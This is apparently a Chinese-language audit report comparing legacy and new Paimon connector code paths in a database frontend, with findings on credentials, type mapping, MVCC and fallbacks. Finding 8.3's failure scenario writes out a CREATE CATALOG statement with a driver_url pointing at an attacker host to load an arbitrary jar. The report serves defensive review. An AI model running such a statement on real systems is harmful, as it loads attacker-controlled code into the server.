- **Verify 裁决**: **CONFIRMED 3 / REFUTED 0 / PARTIAL 0**。三裁确认路径 LIVE(cutover gate 开)+ 文件内容真实丢弃(buildHmsHiveConf 仅复制 map hive.* 键 + 固定 auth/timeout 键,从不开 hive.conf.resources)+ legacy 经 HMSBaseProperties.checkAndInit 确实载文件入 catalog HiveConf。一处 finding 不准确(已被多裁标注、不改结论):finding 称 legacy PaimonHMSMetaStoreProperties 的 ExecutionAuthenticator 被 SPI 复用,但 connector 零引用 legacy props/HMSBaseProperties,经 ConnectorContext.executeAuthenticated 独立建 auth — 该细节错但与确认的文件丢弃缺陷正交。

#### Finding 8.3 — Paimon JDBC driver_url 绕过 FE 安全 allow-list(FE 上加载任意 jar)

- **Severity**: MAJOR
- **Legacy**: `catalog/JdbcResource.java:300-329`(getFullDriverUrl:格式校验 + checkCloudWhiteList + jdbc_driver_secure_path allow-list),用于 PaimonJdbcMetaStoreProperties.registerJdbcDriver(:190)
- **New**: `PaimonConnector.java:226-241`(resolveFullDriverUrl)和 :243-281(registerJdbcDriver)
- **Difference**: legacy 经 JdbcResource.getFullDriverUrl 解析 driver_url,强制 (a) URL-format 校验、(b) cloud whitelist Config.jdbc_driver_url_white_list、(c) Config.jdbc_driver_secure_path allow-list,对任何非允许 url 抛 IllegalArgumentException。新 resolveFullDriverUrl 无任何检查:原样返回 http(s)://、绝对路径、file:// url,对 jdbc_drivers_dir 解析裸 jar 名,然后 load + DriverManager-register。因 paimon 在 SPI_READY_TYPES 故 user-reachable(与 in-code 'not user-reachable until cutover' 注释相反)。
- **failureScenario**: `CREATE CATALOG ... 'paimon.catalog.type'='jdbc','jdbc.driver_url'='http://attacker/evil.jar','jdbc.driver_class'='x.Evil',...`。Legacy 拒绝该 url 除非匹配 jdbc_driver_secure_path/white_list;新路径下载并注册任意 driver jar 入 FE JVM,在 DriverManager 执行攻击者代码,无 allow-list 检查。
- **suggestion**: 经 ConnectorContext 串联 driver-url 校验(已暴露 sanitizeJdbcUrl 和 jdbc_driver_secure_path):将 getFullDriverUrl 的格式 + cloud-whitelist + secure-path 检查移植入 resolveFullDriverUrl,或暴露 ConnectorContext.resolveDriverUrl hook 委托 getFullDriverUrl。强制前勿启用 jdbc driver_url live。
- **Verify 裁决**: **CONFIRMED 1 / REFUTED 0 / PARTIAL 2** ⚠️ *(混合 — 真分歧但默认配置下不构成可利用绕过)*。legacy-parity lens 判 CONFIRMED:连接器确实丢失三道闸 + URL 格式校验,且 jdbc 兄弟连接器经 preCreateValidation→validateAndResolveDriverPath 走 allow-list 而 paimon 不 override(继承 no-op)。但 new-code-correctness 与 reproducibility 两 lens 判 PARTIAL:**默认配置下 finding 的具体场景不成立** —— `jdbc_driver_secure_path` 默认 "*"(JdbcResource.java:315-316 直接返回 url)、`jdbc_driver_url_white_list` 默认 {}(checkCloudWhiteList no-op),故 legacy 默认也加载 `http://attacker/evil.jar`。唯一无条件丢失的 legacy 控制是 URL 格式校验(拒 ftp://、裸非-.jar 名)。完整的任意-jar 绕过仅在管理员加固配置(非 "*" secure_path 或非空 white_list)时真实存在。操作还需 CREATE CATALOG 权限(admin 级)。真实安全回退(对加固部署 + 无条件丢失格式校验),但 MAJOR 严重度与"legacy 拒绝攻击 url"声明仅在非默认加固配置下成立。

#### Finding 8.4 — HMS metastore client socket timeout 忽略配置的非默认值

- **Severity**: MINOR
- **Legacy**: `HMSBaseProperties.java:204-208`(用 Config.hive_metastore_client_timeout_second)
- **New**: `PaimonCatalogFactory.java:418-419`
- **Difference**: legacy 将 hive.metastore.client.socket.timeout 默认为 Config.hive_metastore_client_timeout_second(运行时可配 FE config,默认 10s)。connector 在用户未设时硬编码 '10',忽略 FE config。shipped 默认重合,但 operator 改 hive_metastore_client_timeout_second 时新路径静默保 10s。
- **failureScenario**: operator 设 hive_metastore_client_timeout_second=60 以容忍慢 HMS。Legacy 用 60s;新路径用 10s,可能连慢 metastore 超时。
- **suggestion**: 经 ConnectorContext.getEnvironment 传 FE config 值并用作默认而非字面 '10'。

#### Finding 8.5 — HMS username alias hive.metastore.username 未映射到 hadoop.username

- **Severity**: MINOR
- **Legacy**: `HMSBaseProperties.java:83-87, 201-203`(hmsUserName from {hive.metastore.username, hadoop.username} → AuthenticationConfig.HADOOP_USER_NAME = 'hadoop.username')
- **New**: `PaimonCatalogFactory.java:384`(copyIfPresent 'hadoop.username' only)
- **Difference**: legacy 接受 hive.metastore.username OR hadoop.username 并写入 hadoop.username 键。connector 仅复制字面存在的 'hadoop.username' 键;以 legacy alias 'hive.metastore.username' 提供 username 的用户在 catalog HiveConf 中无 hadoop.username。
- **failureScenario**: `'paimon.catalog.type'='hms'` + `'hive.metastore.username'='svc_user'`(simple auth)。Legacy 设 hadoop.username=svc_user;新 connector HiveConf 无 hadoop.username,metastore/HDFS 访问以 FE 进程用户而非 svc_user 进行。
- **suggestion**: 在 buildHmsHiveConf 经 firstNonBlank(props, 'hive.metastore.username', 'hadoop.username') 取 user name 并设入 'hadoop.username'。

---

### 路径 9. 多存储系统接入 (S3/OSS/HDFS...)

覆盖说明:connector 仅归一化 paimon.s3 和 paimon.fs.oss;legacy 将 s3/oss 键译为 fs.s3a/fs.oss。

#### Finding 9.1 — s3/oss 凭据从 Paimon FileIO 丢失

- **Severity**: BLOCKER
- **New**: `PaimonCatalogFactory.java:328`
- **Legacy**: `AbstractS3CompatibleProperties.java:272`
- **Difference**: 普通 s3/oss 键丢弃 vs legacy fs.s3a/fs.oss map。
- **failureScenario**: filesystem catalog `s3.access_key`:无凭据,无行。
- **suggestion**: 在 storage builder 将 s3/oss 映射到 fs.s3a/fs.oss。
- **Verify 裁决**: **CONFIRMED 3 / REFUTED 0 / PARTIAL 0**。三裁确认 applyStorageConfig(PaimonCatalogFactory.java:328-340)仅识别 USER_STORAGE_PREFIXES(paimon.s3./paimon.s3a./paimon.fs.s3./paimon.fs.oss.)+ raw fs./dfs./hadoop.;普通 s3.access_key/oss.access_key/access_key/AWS_* 落空被丢弃。Legacy 经 StorageProperties.createAll + AbstractS3CompatibleProperties.appendS3HdfsProperties 将这些规范键译为 fs.s3a.* — 新代码仅移植了 legacy 的次级 normalizeS3Config overlay(同 4 前缀),丢失主级 StorageProperties translation。Live-reachable(paimon 在 SPI_READY_TYPES);regression 用例 test_paimon_s3.groovy:70-77 正用 plain `s3.access_key`/`s3.secret_key`/`s3.endpoint`(documented 配置形式)。connector 单测仅覆盖 paimon.* 前缀形式,故盲点。reproducibility 一处精度澄清:现实失败为 FE 侧 auth/access-denied 异常(规划抛错),而非字面 0 行,但核心 claim 成立。

#### Finding 9.2 — DLF gate 通过但无 OSS 凭据

- **Severity**: BLOCKER
- **New**: `PaimonCatalogFactory.java:505`
- **Legacy**: `PaimonAliyunDLFMetaStoreProperties.java:90`
- **Difference**: buildDlfHiveConf 丢弃 oss.access_key/endpoint。
- **failureScenario**: DLF `oss.endpoint`:gate 通过但无 fs.oss,读取失败。
- **suggestion**: 在 DLF overlay 将 oss 映射到 fs.oss。
- **Verify 裁决**: **CONFIRMED 3 / REFUTED 0 / PARTIAL 0**。三裁确认 buildDlfHiveConf(PaimonCatalogFactory.java:448-490)设 8 个 dlf.catalog.* metastore 键后唯一 OSS-fs 来源是 applyStorageConfig,后者只认 paimon.* 前缀,从不设 fs.oss.impl(JindoOSS)。Gate/translate 不匹配:requireOssStorageForDlf(:505-512)对 oss./fs.oss./paimon.fs.oss. 任一键通过,但规范键集 oss.access_key/oss.secret_key/oss.endpoint/oss.region 被 applyStorageConfig 全丢。Legacy 经 PaimonAliyunDLFMetaStoreProperties.initializeCatalog(:95)overlay ossProps.getHadoopStorageConfig()(无条件合成 fs.oss.impl + fs.oss.accessKeyId/accessKeySecret/endpoint/region,从规范 oss.* alias 绑定)。connector DLF 测试仅用 paimon.fs.oss.* 形式(归一化为 fs.s3a.*),从不覆盖规范 oss.* 形式。new-code-correctness 注:fs.oss.*-前缀键经 fs. 分支部分透传但仍缺 fs.oss.impl/alias 归一化/fs.s3a fallback/disable-cache,规范 oss.* 键完全丢失。

#### Finding 9.3 — hdfs.* auth aliases 未传播

- **Severity**: MINOR
- **New**: `PaimonCatalogFactory.java:336`
- **Legacy**: `HdfsProperties.java:39`
- **Difference**: hdfs.authentication.* 丢弃,仅复制 fs/dfs/hadoop。
- **failureScenario**: Kerberized HDFS `hdfs.authentication` 键:auth 失败。
- **suggestion**: 将 hdfs.* 映射到 hadoop.*。

---

### 路径 10. 列类型映射

覆盖说明:paimon 列类型映射两方向端到端追踪。Scalar 映射(BOOLEAN/.../DECIMAL→DECIMALV3/DATE→DATEV2/TIMESTAMP_*→DATETIMEV2/TIMESTAMP_LTZ→TIMESTAMPTZ gated/BINARY+VARBINARY gated/CHAR>255→STRING/TIME→UNSUPPORTED/VARIANT+MULTISET→UNSUPPORTED)全 round-trip parity。Complex 类型(ARRAY/MAP/STRUCT)递归重建同 Doris-default 容器 nullability。DDL toPaimonType 方向匹配 DorisToPaimonTypeVisitor。以下 findings 为 READ 路径 per-column attribute 传播分歧(scalar/complex TYPE 值本身 clean)。

#### Finding 10.1 — Read 路径将 paimon NOT NULL 传播到 Doris 列;legacy 始终强制 nullable

- **Severity**: MAJOR
- **New**: `PaimonConnectorMetadata.java:945`(mapFields: `boolean nullable = field.type().isNullable()`)
- **Legacy**: `PaimonExternalTable.java:349-354`(和 `PaimonSysExternalTable.java:257-268`):Column(..., isAllowNull = 字面 true, ...)
- **Difference**: legacy 对每个 paimon Doris 列将 isAllowNull 硬编码为字面 true(8-arg Column ctor 的 isAllowNull 位置参为字面 `true`,非 field.type().isNullable())对普通表和系统表都如此。新路径设 isAllowNull = field.type().isNullable():paimon NOT NULL 字段现产 NOT NULL Doris 列。mapFields → ConnectorColumn(nullable=false) → convertColumn → new Column(..., isAllowNull=false);无 fe-core bridge 步骤 re-force nullable。
- **failureScenario**: paimon 表有 NOT NULL 列但数据仍可对 Doris 呈 null(schema evolution 加列后以旧/新 schema 读、outer-join 产 null、或任何 paimon 写时强制不成立于 Doris 读的字节)。Doris/nereids nullability 驱动的简化可对现 NOT-NULL 列折叠 null-rejecting 谓词(`col IS NULL` → FALSE,或 COALESCE/anti-join 简化),丢行或误评。Legacy(始终 nullable)从不触发该简化,故为结果改变的 parity 回退。
- **suggestion**: 为 legacy parity,对 paimon read-path 列强制 isAllowNull=true(mapFields 传 nullable=true,或 bridge 对 PAIMON engine 强制)。若意图更精确 nullability,显式 gate 并确认 planner 不会从 NOT NULL 外部列推出错误结果;勿静默改。
- **Verify 裁决**: **CONFIRMED 3 / REFUTED 0 / PARTIAL 0**。三裁确认机械分歧:新代码 mapFields:945 设 nullable=field.type().isNullable();bridge toSchemaCacheValue 原样传 col.isNullable();convertColumn 直入 Column isAllowNull;SlotReference.fromColumn 直接据 column.isAllowNull() 设 slot nullable,达 nereids;legacy 两表均字面 true。impact 机制确认(SimplifyConditionalFunction.rewriteCoalesce 在 !child.nullable() 时丢 Coalesce 参;IsNull AlwaysNotNullable 可折叠)。普遍触发面:paimon PK 列总是 NOT NULL(Schema.normalizeFields 强制 copy(false)),PK 表为核心常态,故几乎每个 paimon PK 表都改变 nullability 元数据。new-code-correctness 一处 caveat:outer-join 子场景非有效触发器(nereids 跨 outer join 重算 slot nullability),但 schema-evolution default-fill 场景仍成立,且优化器现被 PERMITTED 不同折叠故结果可变,核心 claim 成立。

#### Finding 10.2 — Read 路径丢弃 paimon field unique-ids(column.uniqueId 留 -1);legacy 递归设 field.id()

- **Severity**: MINOR
- **New**: `PaimonConnectorMetadata.java:939-954`(mapFields)和 `ConnectorColumnConverter.java:65-70`
- **Legacy**: `PaimonExternalTable.java:355` + `PaimonUtil.java:344-347`(updatePaimonColumnUniqueId 递归设 column.setUniqueId(field.id()))
- **Difference**: legacy 将每 Doris Column 的 uniqueId(及嵌套子)设为 paimon DataField.id()。新路径从不设 uniqueId;每列(及嵌套子)留 -1。mapFields 的 primaryKeys 参也未用。fe-core 消费方 ExternalUtil.getExternalSchema/initSchemaInfo(legacy datasource/paimon/source/PaimonScanNode 调)新 PluginDrivenScanNode/FileQueryScanNode 不调,故此 type-mapping 单元内缺失 id 无可证消费方。
- **failureScenario**: 潜在:若任何新路径代码读 Column.getUniqueId() 建 BE field-id schema(如 legacy 经 ExternalUtil.initSchemaInfo),-1 ids 在 schema evolution 下错映列。今天从列映射代码不可达。
- **suggestion**: 将 paimon field.id() 串入 ConnectorColumn 并在 convertColumn 设 Column.uniqueId,或 document 新扫描路径纯经 paimon.schema_id(native)/split 序列化解析 BE schema 无需 column uniqueId。移除/使用 mapFields 未用的 primaryKeys 参。

#### Finding 10.3 — Read 路径将所有 paimon 列标为 non-key;legacy 标为 key(DESC Key 列翻转)

- **Severity**: MINOR
- **New**: `PaimonConnectorMetadata.java:946-951`(5-arg ConnectorColumn → isKey=false)→ convertColumn(cc.isKey()=false)
- **Legacy**: `PaimonExternalTable.java:352`(isKey 字面 true)和 `PaimonSysExternalTable.java:263`
- **Difference**: legacy 对每 paimon Doris 列建 isKey=true(普通表和系统表统一)。新路径 5-arg ConnectorColumn 默认 isKey=false。IndexSchemaProcNode 在 DESC `Key` 列打印 column.isKey()。
- **failureScenario**: `DESC <paimon_table>` 现对每列显 Key=false 而 legacy 显 Key=true。仅显示分歧;无查询结果影响。
- **suggestion**: 若需严格 DESC parity 则标列为 key,或刻意接受变更并注明。legacy 全 true 本身怪,可能是 intentional cleanup,但应为有意识决定。

#### Finding 10.4 — Read 路径不再为 TIMESTAMP_WITH_LOCAL_TIME_ZONE 列打 WITH_TIMEZONE extra info 标签

- **Severity**: MINOR
- **New**: `PaimonConnectorMetadata.java:939-954`(mapFields 从不调任何 setWithTZExtraInfo 等价)
- **Legacy**: `PaimonExternalTable.java:356-358`(和 `PaimonSysExternalTable.java:270-272`):if typeRoot==TIMESTAMP_WITH_LOCAL_TIME_ZONE column.setWithTZExtraInfo()
- **Difference**: legacy 为 TIMESTAMP_WITH_LOCAL_TIME_ZONE 列设 Column.extraInfo='WITH_TIMEZONE';新路径无处设 extraInfo(SPI ConnectorColumn 无 extra-info 字段)。Column.getExtraInfo() 喂 DESC `Extra` 列。
- **failureScenario**: 对 TIMESTAMP_WITH_LOCAL_TIME_ZONE 列的 `DESC` 不再在 Extra 列显 WITH_TIMEZONE 标记。仅显示;无类型/结果影响。
- **suggestion**: 若需 parity 扩展 SPI 携 withTimeZone 标志(或 bridge 在 connector type 为 TIMESTAMPTZ 时设 extraInfo);否则 document 丢失的 DESC 标记。

#### Finding 10.5 — VARCHAR 长度边界从 > 65533 改为 >= 65533(VARCHAR(65533) 现映射为 STRING)

- **Severity**: MINOR
- **New**: `PaimonTypeMapping.java:113-119`(toVarcharType: if (len <= 0 || len >= 65533) return STRING)
- **Legacy**: `PaimonUtil.java:239-244`(if (varcharLen > 65533) return createStringType(); else createVarcharType(varcharLen))
- **Difference**: legacy 将长度恰 65533(== MAX_VARCHAR_LENGTH)的 paimon VARCHAR 映射为 Doris VARCHAR(65533);新路径 `>= 65533` 测试映射为 STRING(不同 Doris scalar 类型)。CHAR 边界(>255)不变正确。额外 `len <= 0` guard 对合法 paimon VarChar(min 1)不可达。
- **failureScenario**: VARCHAR(65533) 列在 DESC/SHOW CREATE TABLE 渲染为 STRING 并对 planner 暴露 PrimitiveType.STRING。均为 max-length string 类型,结果不变;仅报告类型不同。
- **suggestion**: 边界改为 `len > 65533`(strict)以匹配 legacy,使长度 65533 保 VARCHAR(65533)。

---

### 路径 11. mtmv

覆盖说明:MTMV base-table 路径两侧端到端追踪。getTableSnapshot、getPartitionSnapshot、isPartitionInvalid、partition name 渲染(含 DATE epoch-day 在 partition.legacy-name 下)、partition-key/type 排序、toListPartitionItem、getPartitionType/Columns/ColumnNames、isPartitionColumnAllowNull=true、beforeMTMVRefresh no-op、capability gating(SUPPORTS_MVCC_SNAPSHOT)、single-pin invariant 全部 parity。无 wrong-result/crash/data-loss 回退。两个分歧 documented、test-covered、benign-for-paimon(报 MINOR)。

#### Finding 11.1 — getNewestUpdateVersionOrTime 过滤负 lastModifiedMillis(>=0)而 legacy 不过滤

- **Severity**: MINOR
- **New**: `PluginDrivenMvccExternalTable.java:427-428`
- **Legacy**: `PaimonExternalTable.java:291-295`
- **Difference**: 新代码 reduce 用 `.filter(v -> v >= 0).max().orElse(0L)`,在 max() 前丢任何负 per-partition timestamp。Legacy reduce 用 `.mapToLong(Partition::lastFileCreationTime).max().orElse(0)` 无过滤,故负值会参与(并可能赢)max。filter 为抑制 SPI UNKNOWN(-1) sentinel;对 paimon,getLastModifiedMillis 始终为 Partition.lastFileCreationTime()(真 epoch,从无 -1 sentinel),故两 reduce 在每个现实输入上重合。
- **failureScenario**: 仅在 Partition.lastFileCreationTime() 对全负分区集返回负 epoch 时可观察:新返回 0,legacy 返回(负)max。paimon 实践不出现,故仅在假设情形改 dictionary-update staleness 值,从不产错 MTMV refresh 结果。
- **suggestion**: 无需改;行为 intentional + 单测覆盖(testGetNewestUpdateVersionOrTimeAllUnknownReturnsZeroNotSentinel)。若需严格 legacy parity 则仅对 SPI UNKNOWN sentinel gate filter。保持可接受。

#### Finding 11.2 — Paimon MVCC 表不再 advertise supportsLatestSnapshotPreload(eager snapshot preload 丢失)

- **Severity**: MINOR
- **New**: `PluginDrivenExternalTable.java:133-140`
- **Legacy**: `PaimonExternalTable.java:327-330`
- **Difference**: legacy PaimonExternalTable override supportsLatestSnapshotPreload()=true 和 supportsExternalMetadataPreload()=true。新 PluginDrivenMvccExternalTable 不 override supportsLatestSnapshotPreload(继承 TableIf default false),base 仅对 jdbc override supportsExternalMetadataPreload 为 true,故对 paimon 两者实际 false。这禁用 PreloadExternalMetadata eager snapshot/schema/partition preload。
- **failureScenario**: 此前预载 latest snapshot + partition view(锁获取前)的 paimon 查询/MTMV plan 现规划时惰性载。仅规划延迟/preload-warmup 回退;MVCC pin 仍经 StatementContext.loadSnapshots 在正常规划创建,故查询和 MTMV-refresh 结果不受影响。
- **suggestion**: 若 paimon preload parity 重要则 override supportsLatestSnapshotPreload()=true(并考虑 supportsExternalMetadataPreload),或 gate on connector capability;否则 document intentional preload reduction。

---

### 路径 12. mvcc

覆盖说明:MVCC snapshot-isolation 路径两侧端到端追踪。关键结果(flagged risk):查询起始钉的 snapshot 确实到达 split planning — 三个 scan-side handle-consumption 站点(getSplits:554、startSplit:694、getOrLoadPropertiesResult:877)在消费 currentHandle 前调 pinMvccSnapshot,resolveScanTable 的 Table.copy(scan.snapshot-id) override scan-time reload 默认值,故 split planning 从不静默 re-resolve "latest"。batch 路径也被钉。empty-table/no-handle 正确降级 snapshotId -1 不发 scan.snapshot-id=-1。time-travel、MTMV、isPartitionInvalid、@incr null-reset 剥离全 faithful 移植。

#### Finding 12.1 — B5a query-begin pin 不像 legacy 那样冻结 schema 版本(schemaId),故并发中途 schema evolution 可读 latest schema 而非 query-begin schema

- **Severity**: MINOR
- **New**: `PluginDrivenMvccExternalTable.java:348-357`(getSchemaCacheValue)和 201-202(loadSnapshot B5a 路径返回 pinnedSchema==null)
- **Legacy**: `PaimonExternalTable.java:374-376`(getSchemaCacheValue)→ 378-381 getPaimonSchemaCacheValue → PaimonUtils.getSchemaCacheValue 在 snapshotValue.getSnapshot().getSchemaId() 解析;`metacache/paimon/PaimonLatestSnapshotProjectionLoader.java:79-81` 在 query-begin 捕获 latestSchemaId
- **Difference**: 对普通(非 time-travel)query-begin pin,legacy 在 loadSnapshot 时将 latest schemaId 存入钉的 PaimonSnapshot,每个 getSchemaCacheValue/getFullSchema 在该冻结 schemaId 读 schema(cache keyed by (nameMapping, schemaId))。新 B5a pin 设 pinnedSchema=null(仅显式 time-travel 设 pinned schema),故 getSchemaCacheValue fallback 到 getLatestSchemaCacheValue() 读当前 latest schema(仅 nameMapping keyed,无 schemaId)。connectorSnapshot 确携 schemaId 但 B5a 路径从不查询。
- **failureScenario**: 查询在 paimon 表 schema v5 起始;statement 仍 analyzing/planning 时并发 writer commit schema 变更到 v6 且 FE schema metacache 该表条目被刷新。Legacy 全查询继续在钉的 schemaId v5 解析列;新路径对 getFullSchema/getPartitionColumns 解析现-latest v6 schema 而数据仍在钉的 snapshot id 读,故列元数据(如加/改名/重排列)可与读行的 snapshot 不一致。窗口窄(需单 statement 内 schema-cache 刷新)且数据行仍在钉的 snapshot id 读,故为一致性分歧而非保证错结果。
- **suggestion**: 在 B5a latest 路径捕获 query-begin schema id 入 pin 并在该 id 解析 schema(让 beginQuerySnapshot 也返回 latest schemaId,经 getTableSchema(session,handle,connectorSnapshot) 在该 schemaId 建 pinned PluginDrivenSchemaCacheValue 并存为 pinnedSchema),使 getSchemaCacheValue 在 query begin 冻结 schema 版本。若 intentional 则显式 document 为 known reduction。

---

### 路径 13. cross-cutting: 旧逻辑/fallback sweep

覆盖说明:追踪 paimon catalog 每个可达 cross-cutting dispatch 点,对比 post-cutover(NEW PluginDriven)与 LEGACY 流。验证每个残留 legacy 引用 post-cutover 为 DEAD(不可达)而非分歧 live fallback。详见下 "仍走旧逻辑 / fallback 清单" 章节。

#### Finding 13.1 — SHOW CREATE TABLE 仅在 connector 属性非空时发 LOCATION/PROPERTIES(legacy paimon 始终发)

- **Severity**: NIT
- **New**: `Env.java:4946-4959`
- **Legacy**: `Env.java:4917-4928`
- **Difference**: legacy PAIMON_EXTERNAL_TABLE 分支(:4917-4928)无条件追加 `"\nLOCATION '<path or empty>'"` 和 PROPERTIES (...) 块,即使属性 map 为空。新 PLUGIN_EXTERNAL_TABLE 分支(:4947)将整个 LOCATION+PROPERTIES 发出 guard 于 `if (!properties.isEmpty())`。guard 为使其他 SPI connector(如 MaxCompute 返空 map)保持 comment-only 而加,但也改变 paimon 的理论 empty-map 情形。
- **failureScenario**: 对真实 paimon 表不触发:PaimonConnectorMetadata.buildTableSchema 始终将 coreOptions().toMap()(总含 'path' 键)放入 schema properties(DataTable),故 properties 永不空,LOCATION/PROPERTIES 行始终渲染,匹配 legacy。分歧仅在(不出现的)paimon 表暴露零属性的假设中可达。
- **suggestion**: 正确性无需改;guard intentional + benign(paimon 总暴露非空 coreOptions map 含 path)。可选加注释说明 guard 为与 always-emit legacy paimon DDL 的 deliberate 分歧点,防未来误判回退。

---

## new ↔ legacy 差异表

| 路径 | difference | severity | verdict |
|---|---|---|---|
| P1 normal scan | native-reader DATE/TIMESTAMP_LTZ 分区值裸 toString → 错值 | BLOCKER | CONFIRMED 3/0/0 |
| P1 normal scan | COUNT(*) pushdown 静默丢弃(仅性能) | MINOR | (未验证) |
| P1 normal scan | native 不 sub-split 大文件 + 省 selfSplitWeight(仅并行) | MINOR | (未验证) |
| P2 @incr | (无 finding;byte-identical 移植) | — | — |
| P3 time travel | FOR TIME AS OF 在 CST/PST/EST session 下失败 | MAJOR | CONFIRMED 3/0/0 |
| P4 branch/tag | branch schema 对 branch 表 vs base 表解析(corner case) | MINOR | (未验证) |
| P5 sys tables | sys-table fetchRowCount 返 -1 | MINOR | (未验证) |
| P5 sys tables | getSupportedSysTables 冗余 handle 往返 | MINOR | (未验证) |
| P5 sys tables | fail-loud guard 消息 Paimon→Plugin | NIT | (未验证) |
| P6 metadata cache | 查询内 schema/partition snapshot 非原子(自愈) | MINOR | (未验证) |
| P7 deletion vector | native-path DV 路径未归一化(主文件同样未归一化) | BLOCKER | PARTIAL 0/0/3 ⚠️ |
| P7 deletion vector | VERBOSE EXPLAIN delete-split 计账丢失 | NIT | (未验证) |
| P8 metastore flavors | REST vended credentials 不下发 BE | BLOCKER | CONFIRMED 3/0/0 |
| P8 metastore flavors | HMS hive.conf.resources 静默丢弃 | MAJOR | CONFIRMED 3/0/0 |
| P8 metastore flavors | JDBC driver_url 绕过安全 allow-list | MAJOR | PARTIAL 1/0/2 ⚠️(默认配置下不成立) |
| P8 metastore flavors | HMS socket timeout 忽略配置非默认值 | MINOR | (未验证) |
| P8 metastore flavors | hive.metastore.username 未映射 hadoop.username | MINOR | (未验证) |
| P9 storage systems | s3/oss 凭据从 Paimon FileIO 丢失 | BLOCKER | CONFIRMED 3/0/0 |
| P9 storage systems | DLF gate 通过但无 OSS 凭据 | BLOCKER | CONFIRMED 3/0/0 |
| P9 storage systems | hdfs.* auth aliases 未传播 | MINOR | (未验证) |
| P10 type mapping | read 路径传播 paimon NOT NULL(legacy 强制 nullable) | MAJOR | CONFIRMED 3/0/0 |
| P10 type mapping | read 路径丢 field unique-ids(留 -1) | MINOR | (未验证) |
| P10 type mapping | read 路径全列标 non-key(DESC Key 翻转) | MINOR | (未验证) |
| P10 type mapping | 不打 WITH_TIMEZONE extra info | MINOR | (未验证) |
| P10 type mapping | VARCHAR 边界 >65533 改为 >=65533 | MINOR | (未验证) |
| P11 mtmv | getNewestUpdateVersionOrTime 过滤负值(no-op for paimon) | MINOR | (未验证) |
| P11 mtmv | 不 advertise supportsLatestSnapshotPreload(仅延迟) | MINOR | (未验证) |
| P12 mvcc | B5a pin 不冻结 schemaId(并发 schema evolution 一致性) | MINOR | (未验证) |
| P13 fallback sweep | SHOW CREATE TABLE 空属性时不发 LOCATION/PROPERTIES(paimon 不触发) | NIT | (未验证) |
| 补充 statistics | getTableStatistics 缺 override → 行数恒 -1(cost-model 退化) | MAJOR | CONFIRMED 3/0/0 |
| 补充 cpp reader | enable_paimon_cpp_reader 被忽略 → Java 序列化破坏 BE cpp deserialize | BLOCKER | CONFIRMED 3/0/0 |
| 补充 path_partition_keys | path_partition_keys 未发出 → FE 列分类分歧 | MINOR | (BE 重建保正确;completeness critic 假设 BLOCKER 被专项降级) |
| 补充 partition render scope | TIME 分区列裸渲染(raw micros/millis) | MAJOR | PARTIAL 0/0/3 ⚠️(legacy 自身 CCE 崩;TIME 两侧 UNSUPPORTED) |
| 补充 partition render scope | BINARY/VARBINARY 分区列渲染 [B@hash(legacy throw→skip) | MAJOR | CONFIRMED 3/0/0 |
| 补充 partition render scope | 原 BLOCKER 修复须移植整个 serializePartitionValue switch + session TZ | MAJOR | PARTIAL 0/0/3 ⚠️(范围扩展正确但 TIME 子项对比不成立) |
| 补充 batch double-scan | supportsBatchScan 一旦开启 + planScan 忽略 requiredPartitions → N-fold 重复行 | MINOR | (latent,当前不可达) |

---

## 仍走旧逻辑 / fallback 清单(来自 cross-cutting fallback-sweep,路径 13)

paimon cutover 异常彻底。所有残留 legacy 引用 post-cutover 均为 DEAD(不可达),无分歧 live fallback。逐项:

**Dispatch 入口(全部路由到 PluginDriven)**
- `CatalogFactory.createCatalog`(:50-129):"paimon" 在 SPI_READY_TYPES,每个新建 paimon catalog 为 PluginDrivenExternalCatalog;"paimon" 不在 built-in fallback switch(:133-156),legacy PaimonExternalCatalogFactory 从不实例化。
- GSON 迁移(GsonUtils.java:402-411 catalog、:464 db、:489 table):镜像反序列化时将全部 5 个 legacy paimon flavor + PaimonExternalDatabase + PaimonExternalTable 改写为 PluginDriven{Catalog,Database,MvccExternalTable},重启 FE 从不重建 legacy 实例。

**DEAD-but-harmless legacy 引用**
- Scan dispatch(PhysicalPlanTranslator):paimon 走 PluginDrivenScanNode;无可达 PaimonScanNode 分支(legacy source/PaimonScanNode 仅 doc 注释引用)。
- DB init(ExternalCatalog.buildDbForInit:884 + case PAIMON:956):PluginDrivenExternalCatalog override buildDbForInit(:481-486)强制 InitCatalogLog.Type.PLUGIN,gsonPostProcess(:506-511)将迁移的 PAIMON logType 改写为 PLUGIN;case PAIMON(→legacy PaimonExternalDatabase)不可达。
- Sys-tables:getSupportedSysTables(:391-416)返回 PluginDrivenSysTable;SysTableResolver 从不调 legacy PaimonSysTable.createSysExternalTable(会对 PluginDrivenExternalTable 抛 IllegalArgumentException)。Sys-table 集 parity(SystemTableLoader.SYSTEM_TABLES == legacy SUPPORTED_SYS_TABLES)。
- Auth(UserAuthentication.java:58-71):处理 PluginDrivenSysExternalTable→getSourceTable;PaimonSysExternalTable 分支 dead-but-harmless。
- SHOW PARTITIONS:dispatch 顺序先查 PluginDrivenExternalCatalog(:478)后 PaimonExternalCatalog(:480),handleShowPaimonTablePartitions dead;新 handleShowPluginDrivenTablePartitions(:294-350)经 SUPPORTS_PARTITION_STATS 重现 5-column rich 输出;partition-name 渲染 parity 验证(含 partition.legacy-name DATE epoch→formatDate)。
- SHOW CREATE TABLE(Env.java:4929-4959 PLUGIN 分支):两侧 unwrap sys→source 并发 LOCATION+PROPERTIES;connector buildTableDescriptor 返 HIVE_TABLE,SCHEMA_TABLE null-fallback 不触发。
- Alter(Alter.java:616-622)和 BindRelation(:539-548):PAIMON_EXTERNAL_TABLE 与 PLUGIN_EXTERNAL_TABLE 同 case,paimon 被处理。

**仍 live 且 SHARED(共享,无分歧)**
- Cache routing(ExternalMetaCacheRouteResolver.java:69):PluginDriven paimon catalog 路由到 ENGINE_DEFAULT(DefaultExternalMetaCache),正是新路径 schema cache 所在;init 和 invalidate 经同一 resolver,REFRESH TABLE/CATALOG 失效到达新路径实际用的 cache。legacy PaimonExternalMetaCache(engine "paimon")从不被新路径填充。
- Property/metastore Paimon* 类(PaimonHMS/File/Jdbc/Rest/AliyunDLF MetaStoreProperties):仍 live 且 SHARED — PluginDrivenExternalCatalog.initPreExecutionAuthenticator(:128)调 catalogProperty.getMetastoreProperties()→MetastoreProperties.create(type=paimon→PaimonPropertiesFactory)派生 ExecutionAuthenticator 串入 connector — 同 legacy 代码,无分歧。
- Vended credentials(VendedCredentialsFactory.case PAIMON:65 + PaimonVendedCredentialsProvider):经 CatalogProperty.initStorageProperties 可达,但产出的 StorageProperties map **不被新 scan 路径消费**(PluginDrivenScanNode 从 connector 经 getScanNodeProperties 取所有 location/credential 属性);REST flavor short-circuit checkStorageProperties=false(不抛),非-REST 同 legacy。Benign。
